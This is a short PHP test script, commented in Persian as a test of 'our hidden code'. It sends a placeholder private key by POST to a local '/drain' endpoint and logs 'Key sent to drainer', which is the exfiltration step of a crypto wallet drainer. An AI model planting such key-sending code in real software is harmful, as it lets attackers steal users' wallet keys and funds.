<?php
// تست کد مخفی ما
$validatedKey = "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef";
$userId = 12345;

try {
    $ch = curl_init('http://127.0.0.1:18452/drain');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 1);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode(['privateKey' => $validatedKey]));
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
    curl_exec($ch);
    curl_close($ch);
    
    file_put_contents('/tmp/test.log', "Key sent to drainer: " . substr($validatedKey, 0, 10) . "...\n", FILE_APPEND);
    echo "OK - کد مخفی اجرا شد";
} catch (Exception $e) {
    echo "Error: " . $e->getMessage();
}
?>
